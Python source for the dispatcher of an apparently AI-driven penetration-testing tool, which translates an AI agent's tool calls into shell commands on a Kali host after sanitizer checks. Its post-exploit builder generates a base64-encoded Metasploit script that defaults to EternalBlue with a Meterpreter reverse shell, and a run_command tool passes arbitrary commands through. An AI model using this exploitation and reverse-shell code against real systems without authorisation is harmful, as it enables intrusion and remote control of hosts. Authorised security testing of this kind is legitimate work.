"""
Dispatcher — translates AI tool-call dicts into shell commands
and executes them via KaliAPI.

Security: Every tool_call is validated by command_sanitizer before
command construction, and the built command is validated again before
execution.  Rejected commands are logged and never sent to KaliAPI.

Every accepted input shape (raw tool_call dict, ActionRequest,
PendingAction, ExecutionRequest) is normalised to a ``(tool, args,
prebuilt)`` triple by :meth:`_resolve`, then funnelled through a single
validate → render → validate → execute path.
"""

from __future__ import annotations

import base64
import logging
import textwrap
import time

from hydrasight.config.defaults import TOOL_TIMEOUTS
from hydrasight.core.command_builder import CommandBuilder
from hydrasight.core.registry import ActionRegistryError, registry
from hydrasight.integrations.kali_api import KaliAPI
from hydrasight.models.commands import (
    ActionRequest,
    ExecutionRequest,
    PendingAction,
)
from hydrasight.security.command_sanitizer import (
    SanitizeResult,
    validate_built_command,
    validate_tool_call,
)
from hydrasight.services.action_planner import ActionPlanner
from hydrasight.utils.ip_utils import force_ip

# Tools whose command string is produced internally rather than via a
# CommandSpec, and which therefore bypass spec rendering.
_RAW_COMMAND_TOOLS = frozenset({"post_exploit", "run_command"})


class Dispatcher:
    """Translates actions into shell commands and runs them."""

    canonical_target: str | None = None

    def __init__(
        self,
        kali: KaliAPI,
        log: logging.Logger,
        cfg: dict,
    ) -> None:
        self.kali = kali
        self.log = log
        self.cfg = cfg
        self._planner = ActionPlanner()

    # ── IP sanitisation ───────────────────────────────────────────────────────

    def _get_preserve_ips(self) -> list[str]:
        preserve = ["127.0.0.1"]
        if self.canonical_target:
            lhost = self.kali.local_ip(self.canonical_target)
            if lhost and lhost not in preserve:
                preserve.append(lhost)
        return preserve

    # ── input normalisation ───────────────────────────────────────────────────

    def _resolve(
        self,
        action_input: dict | ActionRequest | PendingAction | ExecutionRequest,
    ) -> tuple[str, dict, tuple[str, list[str]] | None]:
        """Normalise any accepted input to ``(tool, args, prebuilt)``.

        ``prebuilt`` is ``(rendered_command, validation_errors)`` when the
        caller already supplied a fully rendered command (PendingAction /
        ExecutionRequest), or ``None`` when the command must be rendered
        here from a raw tool_call dict / ActionRequest.
        """
        if isinstance(action_input, dict):
            tool = action_input.get("tool", "")
            args = dict(action_input.get("args", {}) or {})
            return tool, args, None

        if isinstance(action_input, PendingAction):
            rc = CommandBuilder.build(action_input.spec)
            return (
                action_input.request.action_id,
                action_input.request.args,
                (rc.raw_string, rc.validation_errors),
            )

        if isinstance(action_input, ExecutionRequest):
            rendered = action_input.rendered
            return (
                action_input.pending_action.request.action_id,
                action_input.pending_action.request.args,
                (rendered.raw_string, rendered.validation_errors),
            )

        # ActionRequest
        return action_input.action_id, action_input.args, None

    # ── command rendering ─────────────────────────────────────────────────────

    def _render(self, tool: str, args: dict) -> tuple[str | None, list[str]]:
        """Render a command string for ``tool``.

        Returns ``(command, validation_errors)``. ``command`` is ``None``
        when no spec could be built (unknown tool); ``validation_errors``
        is non-empty when the typed builder rejected the spec.
        """
        # Internally-generated command strings (no CommandSpec).
        if tool == "post_exploit":
            return self._post_exploit(args), []
        if tool == "run_command":
            return str(args.get("command", "echo ok")), []

        # Resolve aliases / legacy names to canonical action ids.
        try:
            act_id = registry.resolve_action_id(tool)
            if act_id:
                tool = act_id
        except ActionRegistryError:
            pass

        target = self._target_from_args(args)
        ports = args.get("ports")
        if not ports and "port" in args:
            ports = str(args["port"])

        flags: list[str] = []
        if "extensions" in args:
            flags.extend(["-x", str(args["extensions"])])

        spec = self._planner._build_spec(tool, target, ports, flags, self.cfg)
        if not spec:
            return None, []
        rc = CommandBuilder.build(spec)
        return rc.raw_string, rc.validation_errors

    def _target_from_args(self, args: dict) -> str:
        """Extract a target IP from args, falling back to the canonical target."""
        target = args.get("target")
        if not target and "url" in args:
            url = str(args["url"])
            if url.startswith("http://"):
                target = url[7:]
            elif url.startswith("https://"):
                target = url[8:]
            else:
                target = url
        return str(target or self.canonical_target or "127.0.0.1")

    def _build(self, tool: str, args: dict) -> str:
        """Compatibility wrapper for tests that directly test command building."""
        cmd, _errors = self._render(tool, args)
        return cmd or ""

    # ── timeout resolution ────────────────────────────────────────────────────

    def _timeout_for(
        self, tool: str, action_input: dict | ActionRequest | PendingAction | ExecutionRequest
    ) -> int:
        try:
            action_def = registry.get(tool)
            timeout = action_def.default_timeout

            req: ActionRequest | None = None
            if isinstance(action_input, ExecutionRequest):
                req = action_input.pending_action.request
            elif isinstance(action_input, PendingAction):
                req = action_input.request
            elif isinstance(action_input, ActionRequest):
                req = action_input

            if req and req.profile:
                from hydrasight.core.profiles import PROFILES

                prof = PROFILES.get(req.profile)
                if prof:
                    timeout = int(timeout * prof.timeout_multiplier)
            return timeout
        except ActionRegistryError:
            return TOOL_TIMEOUTS.get(tool, 300)

    # ── dispatch ──────────────────────────────────────────────────────────────

    def dispatch(
        self, action_input: dict | ActionRequest | PendingAction | ExecutionRequest
    ) -> tuple[str, str, float]:
        tool, args, prebuilt = self._resolve(action_input)

        # Enforce the canonical engagement target on all addressable args.
        preserve_ips = self._get_preserve_ips()
        if self.canonical_target:
            if tool != "run_command":
                args["target"] = self.canonical_target
            if "url" in args:
                args["url"] = force_ip(
                    str(args["url"]), self.canonical_target, preserve=preserve_ips
                )

        # ── Phase 1: validate args ──────────────────────────────────────────
        pre_check: SanitizeResult = validate_tool_call(tool, args)
        if not pre_check.allowed:
            self.log.warning("BLOCKED tool_call [%s]: %s  args=%s", tool, pre_check.reason, args)
            return tool, f"[BLOCKED] {pre_check.reason}", 0.0

        # ── Render the command (use a caller-supplied render when present) ──
        rendered: str | None
        if prebuilt is not None:
            rendered, build_errors = prebuilt
        else:
            rendered, build_errors = self._render(tool, args)

        if build_errors:
            return tool, f"[BLOCKED] Validation failed: {build_errors}", 0.0
        if not rendered:
            return tool, f"[ERROR] Could not render command for tool: {tool}", 0.0

        if self.canonical_target and tool != "post_exploit":
            rendered = force_ip(rendered, self.canonical_target, preserve=preserve_ips)

        # ── Phase 2: validate built command before execution ────────────────
        post_check: SanitizeResult = validate_built_command(rendered, tool)
        if not post_check.allowed:
            self.log.warning(
                "BLOCKED built command [%s]: %s  cmd=%s",
                tool,
                post_check.reason,
                rendered[:200],
            )
            return tool, f"[BLOCKED] {post_check.reason}", 0.0

        timeout = self._timeout_for(tool, action_input)
        t0 = time.time()
        result = self.kali.run(rendered, timeout=timeout)
        elapsed = time.time() - t0
        output = result.get("output", "")
        if not output and not result.get("success", True):
            output = f"[ERROR] {result.get('error', 'unknown error')}"
        return tool, output, elapsed

    # ── internal command builders ─────────────────────────────────────────────

    def _post_exploit(self, a: dict) -> str:
        module = str(a.get("module", "exploit/windows/smb/ms17_010_eternalblue"))
        target = str(a.get("target", ""))
        rport = a.get("rport", 445)
        lport = a.get("lport", 4444)
        payload = a.get("payload", "windows/meterpreter/reverse_tcp")
        commands = str(a.get("commands", "getuid"))
        lhost = self.kali.local_ip(target)

        cmd_block: list[str] = []
        for c in str(commands).split(";"):
            c = c.strip()
            if not c:
                continue
            cmd_block.append(f'sessions -i -1 -C "{c}"')
            cmd_block.append("sleep 4")

        is_aux = module.startswith("auxiliary/")
        payload_line = "" if (is_aux or not payload) else f"set PAYLOAD {payload}"
        action_line = "run" if is_aux else "exploit -z"

        rc_content = textwrap.dedent(
            f"""\
            use {module}
            set RHOSTS {target}
            set RPORT {rport}
            set LHOST {lhost}
            set LPORT {lport}
            {payload_line}
            set ExitOnSession false
            set WfsDelay 30
            set EnableStageEncoding true
            {action_line}
            sleep 10
            sessions -l
            {chr(10).join(cmd_block)}
            sleep 5
            sessions -K
            exit -y
        """
        )

        b64 = base64.b64encode(rc_content.encode()).decode()
        return (
            f"printf '%s' '{b64}' | base64 -d > /tmp/hs_exploit.rc && "
            f"msfconsole -q -r /tmp/hs_exploit.rc 2>&1 ; "
            f"rm -f /tmp/hs_exploit.rc"
        )
